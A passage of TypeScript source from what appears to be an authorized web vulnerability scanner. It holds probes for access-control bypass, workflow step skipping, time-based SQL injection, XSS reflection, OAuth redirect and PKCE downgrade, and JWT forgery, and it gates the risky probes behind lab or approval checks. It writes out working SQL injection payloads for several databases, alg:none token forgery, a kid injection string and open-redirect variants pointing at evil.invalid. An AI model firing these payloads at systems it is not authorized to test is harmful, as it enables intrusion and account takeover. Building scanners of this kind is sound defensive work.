          resourceId: id, actor: 'owner', status: ownerEx.status, bodyBytes: ownerEx.bodyBytes,
          bodySha256: ownerEx.bodySha256, accessible: ownerEx.status >= 200 && ownerEx.status < 300,
        })
        continue
      }
      const isMutating = method === 'POST' || method === 'PUT' || method === 'PATCH'
      const bodyPayload = isMutating
        ? JSON.stringify(functionLevel && req.functionBody !== undefined ? req.functionBody : (req.jsonBody ?? {}))
        : undefined
      const res = await runner.send({
        origin: ctx.origin, method, pathAndQuery: path,
        headers: {
          ...(bodyPayload ? { 'Content-Type': 'application/json' } : {}),
          ...(req.headers ?? {}),
          ...(a.headers ?? {}),
          ...(a.actor === 'header_bypass' ? { 'X-Original-URL': path, 'X-Rewrite-URL': path } : {}),
        },
        persona: a.persona,
        ...(bodyPayload ? { body: bodyPayload } : {}),
        ...(req.session ? { session: req.session } : {}),
      })
      if (!res.ok) {
        notes.push(`${a.actor} ${id}: ${res.kind}`)
        matrix.push({ resourceId: id, actor: a.actor, status: null, outcome: res.kind })
        if (res.kind === 'approval') runner.stop('approval_required')
        continue
      }
      runner.stage(res.ex)
      if (a.actor === 'owner') ownerEx = res.ex
      const sim = ownerEx && a.actor !== 'owner' ? responseSimilarity(ownerEx.body, res.ex.body) : null
      const ok2xx = res.ex.status >= 200 && res.ex.status < 300
      const secretSeen = secretPattern.test(res.ex.body) || /\[redacted\]/i.test(res.ex.body)
      matrix.push({
        resourceId: id, actor: a.actor, status: res.ex.status, bodyBytes: res.ex.bodyBytes,
        bodySha256: res.ex.bodySha256, similarityToOwner: sim, accessible: ok2xx,
      })
      if (req.secretScan && a.actor === 'viewer_persona' && secretSeen &&
          !anomalies.some(x => x.type === 'secret_disclosed')) {
        let controlPath = path
        let controlPersona: string | undefined
        if (/(?:keys?|tokens?|apikeys?)/i.test(path)) {
          // Common credential-list convention: an explicit masked preview mode for the same actor.
          controlPath = `${path}${path.includes('?') ? '&' : '?'}reveal=0`
          controlPersona = a.persona
        }
        anomalies.push({
          type: 'secret_disclosed',
          path,
          method,
          persona: a.persona,
          controlPath,
          ...(controlPersona ? { controlPersona } : {}),
          secretPattern: secretPattern.source,
          bodyBytes: res.ex.bodyBytes,
          actor: a.actor,
        })
      }
      if (!req.secretScan && a.actor !== 'owner' && ok2xx && (method !== 'GET' || sim === null || sim >= 0.70)) {
        anomalies.push({
          type: 'unauthorized_access', resourceId: id, actor: a.actor, method, status: res.ex.status, similarityToOwner: sim,
          functionLevel,
          ...(method !== 'GET' ? { bodyTemplate: functionLevel && req.functionBody !== undefined ? req.functionBody : (req.jsonBody ?? {}) } : {}),
        })
      }
    }
  }

  if (req.storage && req.dependencyId) {
    try {
      req.storage.markApiDependencyTestedBola(req.dependencyId)
    } catch { /* ignore if dependency row missing */ }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? 'A non-owner actor received an owner-equivalent or mutating 2xx response; build an http_chain Replay Spec from this matrix.'
      : 'Non-owner actors were denied or received different responses.',
    details: { matrix, suggestedReplayKind: 'http_chain' },
  }
}

async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const method: 'POST' | 'PUT' | 'PATCH' =
    req.method === 'PUT' || req.method === 'PATCH' ? req.method : 'POST'
  const checks: Array<Record<string, unknown>> = []

  // Mode A: Quantity / numeric boundary invariant testing (-1, 0, overflow)
  if (req.quantityField) {
    const field = req.quantityField
    const aliases = /^(?:qty|quantity|itemQty|count)$/i.test(field)
      ? ['qty', 'quantity', 'count', 'itemQty']
      : /^(?:amount|value|total|price|cents)$/i.test(field)
        ? ['amount', 'value', 'cents', 'total']
        : [field]
    const bodyWith = (value: number): Record<string, unknown> => {
      const body = { ...(req.jsonBody ?? {}) }
      for (const name of new Set([field, ...aliases])) body[name] = value
      return body
    }
    const baseBody = bodyWith(1)
    const baseEx = await send({
      method,
      pathAndQuery: req.pathAndQuery,
      headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
      body: JSON.stringify(baseBody),
      persona: req.persona,
    })
    const testValues = [-1, 0, 2147483647]
    for (const val of testValues) {
      const ex = await send({
        method,
        pathAndQuery: req.pathAndQuery,
        headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
        body: JSON.stringify(bodyWith(val)),
        persona: req.persona,
      })
      if (!ex) continue
      const accepted = ex.status >= 200 && ex.status < 300
      checks.push({ kind: 'quantity_boundary', field, value: val, status: ex.status, accepted })
      if (accepted) {
        anomalies.push({
          type: 'workflow_quantity_invariant',
          field,
          value: val,
          status: ex.status,
          baselineStatus: baseEx?.status ?? null,
        })
        // Business-logic conservation: the out-of-bounds request is accepted and the response carries
        // a quantity different from the in-bounds control. `ne` + explicit control value is the
        // narrowest assertion that does not assume which direction the conserved value moved.
        const boundary = val <= 0 || val >= 2147483647
        const baseJson = baseEx ? jsonRecord(baseEx.body) : null
        const probeJson = jsonRecord(ex.body)
        if (boundary && baseJson && probeJson) {
          const changed = Object.keys(probeJson).find(k =>
            /^[A-Za-z_][A-Za-z0-9_.-]{0,63}$/.test(k) &&
            (typeof probeJson[k] === 'number' || typeof baseJson[k] === 'number') &&
            Number.isFinite(Number(probeJson[k])) && Number.isFinite(Number(baseJson[k])) &&
            Number(probeJson[k]) !== Number(baseJson[k]))
          if (changed && !anomalies.some(a => a.type === 'invariant_violation')) {
            let activeField = field
            for (const cand of new Set([field, ...aliases])) {
              const single = await send({
                method,
                pathAndQuery: req.pathAndQuery,
                headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
                body: JSON.stringify({ ...(req.jsonBody ?? {}), [cand]: val }),
                persona: req.persona,
              })
              const singleJson = single ? jsonRecord(single.body) : null
              if (singleJson && Number(singleJson[changed]) === Number(probeJson[changed])) { activeField = cand; break }
            }
            anomalies.push({
              type: 'invariant_violation',
              mode: 'delta',
              field: changed,
              comparator: 'ne',
              controlValue: Number(baseJson[changed]),
              expectedValue: Number(probeJson[changed]),
              method,
              path: req.pathAndQuery,
              encoding: 'json',
              body: { ...(req.jsonBody ?? {}), [activeField]: val },
              controlBody: { ...(req.jsonBody ?? {}), [activeField]: 1 },
            })
          }
        }
      }
    }
  }

  // Mode B: Step-skip state transition detector (e.g. draft -> confirm without payment).
  if (req.createPath || (req.expectedTransitions && req.expectedTransitions.length >= 2)) {
    const transitions = (req.expectedTransitions ?? ['draft', 'paid', 'confirmed']).map(t => t.toLowerCase())
    let initialState = transitions[0] ?? 'draft'
    let targetPath = req.pathAndQuery
    let stateKeys: string[] = []
    let falsePrerequisites: string[] = []
    let createStatus: number | null = null
    if (req.createPath) {
      const createEx = await send({
        method: 'POST',
        pathAndQuery: req.createPath,
        headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
        body: JSON.stringify(req.producerBody ?? req.jsonBody ?? {}),
        persona: req.ownerPersona ?? req.persona,
      })
      if (createEx) {
        createStatus = createEx.status
        const createdId = extractCreatedIdFromJson(createEx.body) ??
          (() => { const m = /["']id["']\s*:\s*(?:"([^"]{1,128})"|(\d{1,12}))/i.exec(createEx.body); return m ? (m[1] ?? m[2]) : null })()
        if (createdId && targetPath.includes('{{id}}')) {
          targetPath = targetPath.replaceAll('{{id}}', encodeURIComponent(createdId))
        }
        try {
          const parsed = JSON.parse(createEx.body) as Record<string, unknown>
          const st = parsed.status ?? parsed.state
          if (typeof st === 'string' && st.trim()) initialState = st.trim().toLowerCase()
          for (const [key, value] of Object.entries(parsed)) {
            if (typeof value === 'boolean' && /^(?:paid|payment|approved|authorized|verified|confirmed|activated|completed|fulfilled|shipped)$/i.test(key)) {
              stateKeys.push(key)
              if (value === false) falsePrerequisites.push(key)
            }
          }
        } catch { /* ignore non-JSON create bodies */ }
      } else {
        return { verdict: 'no_signal', summary: 'Prerequisite create step failed; step-skip not tested.', details: { suggestedReplayKind: 'http_chain' } }
      }
      if (createStatus !== null && (createStatus < 200 || createStatus >= 300)) {
        return { verdict: 'no_signal', summary: 'Prerequisite create step was rejected; step-skip not tested.', details: { createStatus, suggestedReplayKind: 'http_chain' } }
      }
    }

    const skipEx = await send({
      method,
      pathAndQuery: targetPath,
      headers: { 'Content-Type': 'application/json', ...(req.headers ?? {}) },
      body: JSON.stringify(req.jsonBody ?? {}),
      persona: req.otherPersona ?? req.persona,
    })
    if (skipEx && skipEx.status >= 200 && skipEx.status < 300) {
      let observedState: string | null = null
      let explicitSkipped = false
      try {
        const parsed = JSON.parse(skipEx.body) as Record<string, unknown>
        const st = parsed.status ?? parsed.state
        if (typeof st === 'string' && st.trim()) observedState = st.trim().toLowerCase()
        if (parsed.skipped === true) explicitSkipped = true
      } catch { /* ignore */ }

      const initialIdx = transitions.indexOf(initialState)
      const observedIdx = observedState ? transitions.indexOf(observedState) : -1
      const stateAdvanced = observedState !== null && observedState !== initialState
      // Any fresh object (draft) whose action succeeds while its prerequisite flags are still false
      // has skipped a required step; a normal draft->paid->confirmed transition never does.
      const skippedStep = explicitSkipped ||
        (stateAdvanced && (falsePrerequisites.length > 0 || (initialIdx >= 0 && observedIdx >= initialIdx + 2)))
      checks.push({
        kind: 'step_skip',
        initialState,
        observedState,
        falsePrerequisites,
        createStatus,
        status: skipEx.status,
        skippedStep,
      })
      if (skippedStep) {
        anomalies.push({
          type: 'workflow_step_skip',
          fromState: initialState,
          toState: observedState ?? transitions[transitions.length - 1],
          falsePrerequisites,
          path: targetPath,
          targetTemplate: req.pathAndQuery,
          createPath: req.createPath ?? null,
          producerBody: req.producerBody ?? req.jsonBody ?? {},
          status: skipEx.status,
        })
      }
    }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? 'Workflow invariant or state-transition skip anomaly observed; confirm via http_chain Replay Spec.'
      : 'No workflow invariant violations observed.',
    details: { checks, suggestedReplayKind: 'http_chain' },
  }
}

function medianOf(nums: readonly number[]): number {
  if (nums.length === 0) return 0
  const sorted = [...nums].sort((a, b) => a - b)
  const mid = Math.floor(sorted.length / 2)
  return sorted.length % 2 === 1 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2
}

async function diffSqlTimeDifferential(ctx: DiffContext, grant: Grant): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const location: SurfaceParamLocation = req.paramLocation ?? (req.method && req.method !== 'GET' ? 'json' : 'query')
  const method = req.method ?? (['json', 'form', 'xml', 'graphql_var'].includes(location) ? 'POST' : 'GET')

  if (!localLab) {
    if (tier < 3) {
      throw new BrokerDenied('sqli_time_diff is blocked on public projects below Tier 3 (requires local-lab or explicit Tier-3 HITL approval).')
    }
    if (!(grant.isStateChangeApproved?.(ctx.origin, method, req.pathAndQuery) ?? false)) {
      throw new BrokerApprovalRequired(ctx.origin, method, req.pathAndQuery)
    }
  }

  const delayMs = Math.max(1500, Math.min(3000, Math.round(req.delayMs ?? 1500)))
  const delaySec = Number((delayMs / 1000).toFixed(2))
  const delaySecInt = Math.max(1, Math.round(delayMs / 1000))
  const baseValue = req.baselineValue ?? '1'

  const sqliteDelay = Math.min(90_000_000, delayMs * 25_000)
  const allCandidates: Array<{ dialect: 'mysql' | 'postgres' | 'mssql' | 'sqlite'; style: string; payload: string }> = [
    { dialect: 'mysql', style: 'numeric', payload: `${baseValue} AND SLEEP(${delaySec})` },
    { dialect: 'mysql', style: 'single_quote', payload: `${baseValue}' AND SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'single_quote', payload: `${baseValue}' AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'postgres', style: 'numeric', payload: `${baseValue} AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL` },
    { dialect: 'mssql', style: 'single_quote', payload: `${baseValue}'; WAITFOR DELAY '0:0:${delaySecInt}'-- -` },
    { dialect: 'sqlite', style: 'single_quote', payload: `${baseValue}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
    // OR-branch variants keep the delay expression reachable when the left comparison is false (a
    // blind query often filters on a value the caller's own baseline does not match).
    { dialect: 'mysql', style: 'or_branch', payload: `${baseValue}' OR SLEEP(${delaySec})-- -` },
    { dialect: 'postgres', style: 'or_branch', payload: `${baseValue}' OR (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
    { dialect: 'sqlite', style: 'or_branch', payload: `${baseValue}' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
  ]
  const candidates = req.dialect
    ? [
        ...allCandidates.filter(c => c.dialect === req.dialect),
        ...allCandidates.filter(c => c.dialect !== req.dialect),
      ]
    : allCandidates

  const candidateSummaries: Array<Record<string, unknown>> = []
  for (const cand of candidates) {
    const b1 = await send(injectParam(req, baseValue))
    const p1 = await send(injectParam(req, cand.payload))
    if (!b1 || !p1) continue
    if (b1.status >= 500 || p1.status >= 500) continue
    if (p1.durationMs - b1.durationMs < 0.7 * delayMs) {
      candidateSummaries.push({ dialect: cand.dialect, style: cand.style, round1DeltaMs: p1.durationMs - b1.durationMs, passed: false })
      continue
    }
    const b2 = await send(injectParam(req, baseValue))
    const p2 = await send(injectParam(req, cand.payload))
    const b3 = await send(injectParam(req, baseValue))
    const p3 = await send(injectParam(req, cand.payload))
    if (!b2 || !p2 || !b3 || !p3) continue
    const baseDurations = [b1.durationMs, b2.durationMs, b3.durationMs]
    const probeDurations = [p1.durationMs, p2.durationMs, p3.durationMs]
    const statusesOk = [b1, p1, b2, p2, b3, p3].every(e => e.status < 500)
    const baselineMedianMs = medianOf(baseDurations)
    const probeMedianMs = medianOf(probeDurations)
    const minProbeMs = Math.min(...probeDurations)
    const maxBaselineMs = Math.max(...baseDurations)
    const nonOverlapping = minProbeMs > maxBaselineMs
    const deltaOk = probeMedianMs - baselineMedianMs >= 0.85 * delayMs
    const passed = statusesOk && nonOverlapping && deltaOk
    const summaryRow = {
      dialect: cand.dialect,
      style: cand.style,
      delayMs,
      baselineMedianMs,
      probeMedianMs,
      minProbeMs,
      maxBaselineMs,
      nonOverlapping,
      passed,
    }
    candidateSummaries.push(summaryRow)
    if (passed) {
      anomalies.push({ type: 'sql_time_differential', ...summaryRow })
      return {
        verdict: 'signal',
        summary: `Non-overlapping time-based SQL differential (${cand.dialect}/${cand.style}) held across 3 interleaved rounds (probe median ${probeMedianMs}ms vs baseline ${baselineMedianMs}ms).`,
        details: { ...summaryRow, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
      }
    }
  }

  return {
    verdict: 'no_signal',
    summary: 'No non-overlapping time-based SQL differential observed across 3 rounds.',
    details: { delayMs, suggestedReplayKind: 'sql_time_diff', candidates: candidateSummaries },
  }
}

export type ReflectionContext = 'event_handler_attr' | 'href_url' | 'js_string' | 'html_attr' | 'html_body'

export interface ReflectionAnalysis {
  reflected: boolean
  context: ReflectionContext
  unencodedChars: string[]
  domSinkHint: string | null
  mediaType: string
  renderable: boolean
  exploitable: boolean
}

/**
 * Shared reflection analysis for reflected *and* second-order (stored) XSS checks.
 * Locates `canary` in `body` and classifies the surrounding rendering context.
 */
export function analyzeXssReflection(body: string, mediaType: string, canary: string): ReflectionAnalysis {
  const idx = body.indexOf(canary)
  const mediaLower = mediaType.toLowerCase()
  const renderable = mediaLower.includes('html') || mediaLower.includes('svg') || mediaLower.includes('xml') || /^\s*</.test(body)
  if (idx < 0) {
    return { reflected: false, context: 'html_body', unencodedChars: [], domSinkHint: null, mediaType, renderable, exploitable: false }
  }

  const windowStart = Math.max(0, idx - 200)
  const before = body.slice(windowStart, idx)
  const snippet = body.slice(idx, Math.min(body.length, idx + canary.length + 16))
  const unencodedChars: string[] = []
  for (const ch of ['"', "'", '<', '>']) {
    if (snippet.includes(ch)) unencodedChars.push(ch)
  }

  let context: ReflectionContext = 'html_body'
  if (/\bon[a-z]+\s*=\s*["']?[^"'>]*$/i.test(before)) {
    context = 'event_handler_attr'
  } else if (/\b(?:href|src|action|formaction)\s*=\s*["']?[^"'>]*$/i.test(before)) {
    context = 'href_url'
  } else if (/<script\b[^>]*>[\s\S]*$/i.test(before) && !/<\/script>/i.test(before.slice(before.lastIndexOf('<script')))) {
    context = 'js_string'
  } else if (/<[a-zA-Z0-9_-]+(?:\s+[^>]*)?\s+[a-zA-Z0-9_:-]+\s*=\s*["']?[^"'>]*$/i.test(before)) {
    context = 'html_attr'
  }

  const sinkMatch = /\b(innerHTML|outerHTML|document\.write|eval|Function)\b/i.exec(body.slice(Math.max(0, idx - 200), Math.min(body.length, idx + 200)))
  const domSinkHint = sinkMatch ? sinkMatch[1] : null

  const exploitable =
    renderable && (
      (context === 'html_body' && (unencodedChars.includes('<') || unencodedChars.includes('>') || Boolean(domSinkHint))) ||
      (context === 'html_attr' && (unencodedChars.includes('"') || unencodedChars.includes("'"))) ||
      (context === 'js_string' && (unencodedChars.includes('"') || unencodedChars.includes("'") || unencodedChars.includes('<') || Boolean(domSinkHint))) ||
      context === 'href_url' ||
      context === 'event_handler_attr' ||
      Boolean(domSinkHint)
    )

  return { reflected: true, context, unencodedChars, domSinkHint, mediaType, renderable, exploitable }
}

async function diffXssContext(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const canary = `gxss${randToken(8)}`
  const probeEx = await send(injectParam(req, `${canary}"'<>`))
  if (!probeEx) return { verdict: 'inconclusive', summary: 'XSS context probe request failed.', details: {} }

  const body = probeEx.body
  const analysis = analyzeXssReflection(body, probeEx.mediaType, canary)
  if (!analysis.reflected) {
    return { verdict: 'no_signal', summary: 'Probe marker was not reflected in response.', details: { status: probeEx.status } }
  }
  const { context, unencodedChars, domSinkHint, exploitable } = analysis

  if (exploitable) {
    anomalies.push({
      type: 'xss_context',
      context,
      unencodedChars,
      domSinkHint,
      suggestedReplayKind: 'browser_chain',
      suggestedAction: 'dom_xss_sink_hook',
    })
  }

  return {
    verdict: exploitable ? 'signal' : 'no_signal',
    summary: exploitable
      ? `Reflected probe landed in ${context} context with unencoded [${unencodedChars.join(',')}]${domSinkHint ? ` near ${domSinkHint} sink` : ''}; escalate to browser_chain (dom_xss_sink_hook).`
      : `Probe marker reflected in ${context} context but dangerous syntax characters were encoded.`,
    details: {
      reflected: true,
      context,
      unencodedChars,
      domSinkHint,
      mediaType: probeEx.mediaType,
      suggestedReplayKind: 'browser_chain',
      suggestedAction: 'dom_xss_sink_hook',
    },
  }
}

async function diffAuthProtocolAudit(
  ctx: DiffContext,
  canaryBroker: CanaryBroker | undefined,
  grant: Grant,
): Promise<DiffOutcome> {
  const { req, runner, send, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const checks: Array<Record<string, unknown>> = []

  // Branch A: OAuth / OIDC redirect_uri & PKCE downgrade audit
  if (/redirect_uri=/i.test(req.pathAndQuery) || /oauth|authorize/i.test(req.pathAndQuery)) {
    const baseUrl = new URL(req.pathAndQuery, 'http://guardian.invalid')
    // Learn the app's registered redirect target behaviourally: when the caller did not supply a
    // redirect_uri, the authorize endpoint still issues its default 3xx Location. Use that host as the
    // baseline for substring/prefix bypass variants instead of assuming a hardcoded client origin.
    let origRedirect = baseUrl.searchParams.get('redirect_uri')
    if (!origRedirect) {
      const defaultEx = await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: req.headers })
      const learned = redirectBaseFromLocation(defaultEx?.respHeaders.location ?? '')
      origRedirect = learned ?? 'https://app.example.invalid/cb'
      checks.push({ check: 'oauth_default_redirect_learned', learned: Boolean(learned), baselineHost: (() => { try { return new URL(origRedirect).hostname } catch { return null } })() })
    }
    const origParsed = (() => {
      try { return new URL(origRedirect) } catch { return new URL('https://app.example.invalid/cb') }
    })()

    const badControlUrl = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    badControlUrl.searchParams.set('redirect_uri', 'https://unrelated-control.invalid/cb')
    badControlUrl.searchParams.set('code_challenge_method', 'S256')
    badControlUrl.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
    const badCtrlEx = await send({ method: 'GET', pathAndQuery: badControlUrl.pathname + badControlUrl.search, headers: req.headers })

    const s256Url = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    s256Url.searchParams.set('redirect_uri', origParsed.href)
    s256Url.searchParams.set('code_challenge_method', 'S256')
    s256Url.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
    await send({ method: 'GET', pathAndQuery: s256Url.pathname + s256Url.search, headers: req.headers })

    const redirectVariants = [
      { name: 'userinfo_at', value: `https://${origParsed.host}@evil.invalid/cb` },
      { name: 'backslash_at', value: `https://${origParsed.host}\\@evil.invalid/cb` },
      { name: 'subdomain_prefix', value: `https://${origParsed.hostname}.evil.invalid/cb` },
      { name: 'suffix_match', value: `https://evil-${origParsed.hostname}/cb` },
    ]
    const badCtrlStatus = badCtrlEx?.status ?? 400
    for (const rv of redirectVariants) {
      const u = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
      u.searchParams.set('redirect_uri', rv.value)
      u.searchParams.set('code_challenge_method', 'S256')
      u.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
      const ex = await send({ method: 'GET', pathAndQuery: u.pathname + u.search, headers: req.headers })
      if (!ex) continue
      const loc = ex.respHeaders.location ?? ''
      const accepted = (ex.status >= 300 && ex.status < 400 && (loc.includes('evil.invalid') || loc.includes(`evil-${origParsed.hostname}`))) ||
        (ex.status < 400 && badCtrlStatus >= 400)
      checks.push({ check: `oauth_redirect_${rv.name}`, status: ex.status, accepted })
      if (accepted) {
        anomalies.push({ type: 'oauth_redirect_differential', variant: rv.name, status: ex.status, location: loc })
      }
    }

    // PKCE downgrade to plain
    const pkcePlainUrl = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    pkcePlainUrl.searchParams.set('redirect_uri', origParsed.href)
    pkcePlainUrl.searchParams.set('code_challenge_method', 'plain')
    pkcePlainUrl.searchParams.set('code_challenge', 'plain-challenge-token-123456')
    const plainEx = await send({ method: 'GET', pathAndQuery: pkcePlainUrl.pathname + pkcePlainUrl.search, headers: req.headers })
    if (plainEx && plainEx.status >= 200 && plainEx.status < 400 && badCtrlStatus >= 400) {
      checks.push({ check: 'pkce_plain_downgrade', status: plainEx.status, accepted: true })
      anomalies.push({ type: 'pkce_downgrade', method: 'plain', status: plainEx.status })
    }
  }

  // Branch B: Broker-side JWT authMutation primitives
  if (req.persona && tier >= 2) {
    const validRes = await runner.send({
      origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
      headers: req.headers, persona: req.persona, session: req.session, runId: req.runId, assignmentId: req.assignmentId,
    })
    const anonRes = await runner.send({
      origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
      headers: req.headers, persona: undefined, session: req.session, runId: req.runId, assignmentId: req.assignmentId,
    })
    if (validRes.ok) runner.stage(validRes.ex)
    if (anonRes.ok) runner.stage(anonRes.ex)
    const anonRejected = !anonRes.ok || anonRes.ex.status === 401 || anonRes.ex.status === 403
    if (validRes.ok && validRes.ex.status >= 200 && validRes.ex.status < 300 && anonRejected) {
      let mintedJkuToken: string | null = null
      const mutList: Array<{ name: string; mutation: NonNullable<BrokerHttpRequest['authMutation']> }> = [
        { name: 'alg_none', mutation: { kind: 'alg_none' } },
        { name: 'strip_signature', mutation: { kind: 'strip_signature' } },
        { name: 'expired_replay', mutation: { kind: 'expired_replay', skewSeconds: 7200 } },
        { name: 'kid_inject', mutation: { kind: 'kid_inject', value: "1' OR '1'='1" } },
        { name: 'rs256_to_hs256_jwks', mutation: { kind: 'rs256_to_hs256_jwks', ...(req.jwksUrl ? { jwksUrl: req.jwksUrl } : {}) } },
      ]
      if (canaryBroker) {
        if (!canaryBroker.listenerInfo().running) await canaryBroker.startListener()
        const minted = canaryBroker.mintCanary(req.runId ?? 'auth-audit', 'jwt-jku', ctx.origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)
        mintedJkuToken = minted.token
        mutList.push({ name: 'jku_x5u_canary', mutation: { kind: 'jku_x5u_canary', header: 'jku', url: minted.httpUrl } })
      }
      if (localLab || tier >= 3) {
        mutList.push({ name: 'claim_swap', mutation: { kind: 'claim_swap', claims: { role: 'admin' } } })
      }
      for (const m of mutList) {
        const res = await runner.send({
          origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
          headers: req.headers, persona: req.persona, authMutation: m.mutation,
          runId: req.runId, assignmentId: req.assignmentId,
        })
        if (!res.ok) continue
        runner.stage(res.ex)
        const sim = responseSimilarity(validRes.ex.body, res.ex.body)
        const ok2xx = res.ex.status >= 200 && res.ex.status < 300
        let canaryTriggered = false
        if (m.name === 'jku_x5u_canary' && canaryBroker && mintedJkuToken) {
          let check = canaryBroker.checkCanary(mintedJkuToken)
          for (let attempt = 0; attempt < 4 && !check.triggered; attempt += 1) {
            await new Promise(resolve => setTimeout(resolve, 60))
            check = canaryBroker.checkCanary(mintedJkuToken)
          }
          canaryTriggered = check.triggered
        }
        const accepted = (ok2xx && sim >= 0.85) || canaryTriggered
        checks.push({
          check: `jwt_${m.name}`,
          status: res.ex.status,
          similarity: sim,
          accepted,
          ...(m.name === 'jku_x5u_canary' ? { canaryTriggered } : {}),
        })
        if (ok2xx && sim >= 0.85) {
          anomalies.push({ type: 'jwt_auth_mutation_bypass', mutation: m.name, status: res.ex.status, similarity: sim })
        } else if (canaryTriggered) {
          anomalies.push({ type: 'jwt_jku_x5u_oob_canary', mutation: m.name, status: res.ex.status, canaryTriggered: true })
        }
      }
    }
  }

  // Branch C: forged token presented in a JSON/form body field (or bearer header) when the persona
  // is not a JWT credential. The payload subject/tenant is harvested from the target's own session
  // route, so no secret or benchmark knowledge is required. Control = same payload with a random
  // signature; probe = alg:none.
  const claims = req.identityClaims ?? {}
  const claimCandidates: Array<Record<string, unknown>> = []
  const subject = claims.email ?? claims.mail ?? claims.sub ?? claims.id ?? claims.userId
  if (subject) claimCandidates.push({ sub: subject })
  const tenantClaim = claims.store ?? claims.tenant ?? claims.org ?? claims.workspace ?? claims.team
  if (tenantClaim || claims.role) {
    claimCandidates.push({
      ...(subject ? { sub: subject } : {}),
      ...(tenantClaim ? { store: tenantClaim, tenant: tenantClaim } : {}),
      ...(claims.role ? { role: claims.role } : {}),
      scope: 'read_write',
      ...(claims.id ? { uid: claims.id } : {}),
    })
  }
  const b64u = (value: unknown): string => Buffer.from(JSON.stringify(value)).toString('base64url')
  const forge = (payload: Record<string, unknown>, alg: 'none' | 'HS256', signed: boolean): string => {
    const header = b64u({ alg, typ: 'JWT' })
    const body = b64u(payload)
    return signed ? `${header}.${body}.${randToken(43)}` : `${header}.${body}.`
  }
  if (claimCandidates.length > 0) {
    const methods = new Set<'body' | 'header'>()
    if ((req.method ?? 'GET') !== 'GET' && (req.tokenFields?.length ?? 0) > 0) methods.add('body')
    if (/authorization|bearer|reports?\/(?:sales|summary)|api\/(?:v\d+\/)?(?:tokens?|reports?|session)/i.test(req.pathAndQuery)) methods.add('header')
    for (const transport of methods) {
      const candidates = transport === 'body' ? (req.tokenFields ?? []).slice(0, 3) : ['authorization']
      let detected = false
      for (const field of candidates) {
        for (const payload of claimCandidates.slice(0, 2)) {
          const control = forge(payload, 'HS256', true)
          const probe = forge(payload, 'none', false)
          const request = (token: string): InjectedRequest => transport === 'body'
            ? { method: (req.method ?? 'POST'), pathAndQuery: req.pathAndQuery, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...(req.jsonBody ?? {}), [field]: token }) }
            : { method: (req.method ?? 'GET'), pathAndQuery: req.pathAndQuery, headers: { Authorization: `Bearer ${token}` } }
          const controlRes = await send(request(control))
          if (!controlRes || controlRes.status < 400 || controlRes.status >= 500) continue
          const probeRes = await send(request(probe))
          if (!probeRes || probeRes.status < 200 || probeRes.status >= 300) continue
          if (controlRes.status === probeRes.status && responseSimilarity(controlRes.body, probeRes.body) >= 0.98) continue
          anomalies.push({
            type: transport === 'body' ? 'jwt_body_token_bypass' : 'jwt_authorization_forgery',
            path: req.pathAndQuery.split('?')[0],
            method: req.method ?? 'POST',
            mutation: 'alg_none',
            transport,
            tokenTransport: transport === 'body' ? 'json' : 'header',
            encoding: 'json',
            tokenField: field,
            subject: typeof payload.sub === 'string' ? payload.sub : (typeof payload.store === 'string' ? payload.store : undefined),
            body: transport === 'body' ? { ...(req.jsonBody ?? {}) } : undefined,
            controlStatus: controlRes.status,
            acceptedStatus: probeRes.status,
            similarity: responseSimilarity(controlRes.body, probeRes.body),
            claims: Object.keys(payload),
          })
          checks.push({ check: `jwt_forged_${transport}_${field}`, controlStatus: controlRes.status, acceptedStatus: probeRes.status, accepted: true })
          detected = true
          break
        }
        if (detected) break
      }
    }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? `Auth protocol differential detected ${anomalies.length} issue(s); build an auth_protocol_proof Replay Spec.`
      : 'No OAuth/PKCE or JWT mutation bypass signals observed.',
    details: { checks, suggestedReplayKind: 'auth_protocol_proof' },
  }
}

function validateXxeCustomPayload(customPayload: string) {
  if (
    containsDestructivePayload(customPayload) ||
